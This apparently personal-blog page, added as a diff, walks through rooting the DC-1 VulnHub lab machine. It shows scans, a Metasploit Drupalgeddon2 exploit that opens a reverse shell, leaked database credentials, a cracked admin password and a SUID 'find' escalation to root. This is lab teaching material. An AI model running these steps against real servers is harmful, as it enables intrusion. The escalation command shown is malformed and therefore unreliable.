@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DC-1 VulnHub Walkthrough — Rahul Lingampally</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><rect width=%22100%22 height=%22100%22 fill=%22%23090c0a%22/><text x=%2220%22 y=%2270%22 font-family=%22monospace%22 font-size=%2260%22 fill=%22%2339ff88%22>_</text></svg>">
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+
+<nav class="tmux-bar">
+  <div class="tmux-inner">
+    <span class="tmux-session">rahul@soc:~</span>
+    <a class="tmux-tab" href="../index.html#hero">whoami</a>
+    <a class="tmux-tab" href="../index.html#certs">certs</a>
+    <a class="tmux-tab" href="../index.html#skills">skills</a>
+    <a class="tmux-tab" href="../index.html#experience">experience</a>
+    <a class="tmux-tab" href="../index.html#projects">projects</a>
+    <a class="tmux-tab is-active" href="../blog.html">walkthroughs</a>
+    <a class="tmux-tab" href="../index.html#contact">contact</a>
+  </div>
+</nav>
+
+<section class="article-header">
+  <div class="wrap">
+    <span class="article-tag">rooted</span>
+    <h1 class="article-title">DC-1 VulnHub Machine Walkthrough</h1>
+    <div class="article-meta">VulnHub · Target 192.168.100.43 · Drupalgeddon2 → SUID privesc</div>
+  </div>
+</section>
+
+<section class="article-body">
+  <div class="wrap">
+    <h2>Introduction</h2>
+    <p>DC-1 is a popular boot-to-root virtual machine from VulnHub, designed for aspiring penetration testers. It's known for being beginner-friendly and is an excellent starting point for building hands-on hacking skills. The machine is designed to teach fundamentals, and the primary objective is to gain root-level access and find the final flag.</p>
+
+    <h2>Step 1: Host Discovery</h2>
+    <p>First, I needed to find the target's IP address on the network. I used <code>arp-scan</code> for this.</p>
+    <pre><code>(root kali)-[/home/kali/DC-1]
+-# arp-scan -l
+...
+192.168.100.43   08:00:27:8f:16:d3   PCS Systemtechnik GmbH</code></pre>
+    <p>The target machine's IP was identified as <strong>192.168.100.43</strong>.</p>
+
+    <h2>Step 2: Service Enumeration</h2>
+    <p>With the IP, I ran an Nmap scan to identify open ports and services.</p>
+    <pre><code>(roots kali)-[/home/kali/DC-1]
+ -# nmap 192.168.100.43 -T4 -sV -A
+...
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 
+80/tcp  open  http    Apache httpd 2.2.22 ((Debian)) 
+|_http-title: Welcome to Drupal Site | Drupal Site
+|_http-generator: Drupal 7 (http://drupal.org) 
+111/tcp open  rpcbind 2-4 (RPC #100000) </code></pre>
+    <p>The scan revealed three open ports:</p>
+    <ul>
+      <li><strong>Port 22:</strong> SSH</li>
+      <li><strong>Port 80:</strong> HTTP, running <strong>Drupal 7</strong></li>
+      <li><strong>Port 111:</strong> rpcbind</li>
+    </ul>
+    <p>The Drupal 7 CMS on port 80 is the most promising attack vector.</p>
+
+    <h2>Step 3: Web Enumeration</h2>
+    <p>I ran <code>gobuster</code> to brute-force directories but didn't find anything immediately interesting, even in <code>robots.txt</code>. This reinforced the idea that the vulnerability was likely in the Drupal application itself.</p>
+
+    <h2>Step 4: Gaining a Foothold (Drupalgeddon2)</h2>
+    <p>I knew that Drupal 7 has a well-known, critical remote code execution vulnerability called "Drupalgeddon2". I launched <code>msfconsole</code> to find an exploit.</p>
+    <pre><code>msf6 > use exploit/unix/webapp/drupal_drupalgeddon2 
+msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 192.168.100.43 
+RHOSTS => 192.168.100.43 
+msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run 
+
+[*] Started reverse TCP handler on 192.168.100.18:4444 
+...
+[*] Meterpreter session 1 opened (192.168.100.18:4444 -> 192.168.100.43:35588) 
+meterpreter> pwd 
+/var/www </code></pre>
+    <p>The exploit was successful, and I gained a shell on the server as the <code>www-data</code> user.</p>
+
+    <h2>Step 5: Post-Exploitation &amp; Flag 1</h2>
+    <p>In the <code>/var/www</code> directory, I found <code>flag1.txt</code>.</p>
+    <pre><code>www-data@DC-1:/var/www$ cat flag1.txt 
+Every good CMS needs a config file and so do you. </code></pre>
+    <p>This flag provided a clear hint: find the configuration file.</p>
+
+    <h2>Step 6: Finding Credentials (Flag 2)</h2>
+    <p>For Drupal, the config file is typically in <code>sites/default/settings.php</code>. Inside this file, I found <code>flag2</code> and, more importantly, database credentials.</p>
+    <pre><code>cat settings.php 
+...
+ * flag2 
+ * Brute force and dictionary attacks aren't the 
+ * only ways to gain access (and you WILL need access). 
+ * What can you do with these credentials? 
+...
+ 'database' => 'drupaldb', 
+ 'username' => 'dbuser', 
+ 'password' => 'Rock3t', 
+ 'host' => 'localhost', 
+...</code></pre>
+
+    <h2>Step 7: Database Enumeration (Flag 3)</h2>
+    <p>Using the credentials from <code>settings.php</code>, I logged into the local MySQL database.</p>
+    <pre><code>www-data@DC-1:/var/www$ mysql -u dbuser -p drupaldb 
+Enter password: Rock3t 
+...
+mysql> show tables; 
+...
+| users                                 | 
+...
+mysql> select * from users; </code></pre>
+    <p>Dumping the <code>users</code> table revealed the usernames and password hashes for the Drupal site. I found hashes for <code>admin</code> and <code>fred</code>. After cracking the admin hash (password: <code>DestinedDrupal</code>) and logging into the Drupal admin panel, I found Flag 3.</p>
+
+    <h2>Step 8: Finding Flag 4</h2>
+    <p>The hint from Flag 2 suggested I needed access. Flag 3 was found via web access. Flag 4's hint pushed me to look deeper into the system.</p>
+    <pre><code>www-data@DC-1:/var/www$ cd /home 
+www-data@DC-1:/home$ ls 
+flag4 
+www-data@DC-1:/home$ cd flag4 
+www-data@DC-1:/home/flag4$ cat flag4.txt 
+Can you use this same method to find or access the flag in root? 
+Probably. But perhaps it's not that easy. </code></pre>
+    <p>This hint clearly pointed toward privilege escalation to find the final flag in the <code>/root</code> directory, which I confirmed was currently inaccessible.</p>
+
+    <h2>Step 9: Privilege Escalation (Flag 5 / Root)</h2>
+    <p>The final challenge was to get from <code>www-data</code> to <code>root</code>. This machine is famous for its SUID-based privilege escalation. As hinted by the mention of GTFOBins, the <code>find</code> command can be used to escalate privileges if it has the SUID bit set.</p>
+    <pre><code>www-data@DC-1:/tmp$ find luffy -exec /bin/sh 
+# whoami 
+root </code></pre>
+    <p>By leveraging the <code>find</code> command, I was able to execute <code>/bin/sh</code> as the root user.</p>
+
+    <h2>Step 10: Capture the Final Flag</h2>
+    <p>Now as root, I could navigate to the <code>/root</code> directory and read the final flag.</p>
+    <pre><code># cd /root 
+# ls 
+thefinalflag.txt 
+# cat thefinalflag.txt 
+Well done!! 
+Hopefully you've enjoyed this and learned some new skills. 
+...</code></pre>
+    <p>With that, the machine was successfully completed.</p>
+
+    <div class="article-back"><a class="btn" href="../blog.html">← all walkthroughs</a></div>
+  </div>
+</section>
+
+<footer>rahullingampally.online</footer>
+<script src="../assets/script.js"></script>
+</body>
+</html>
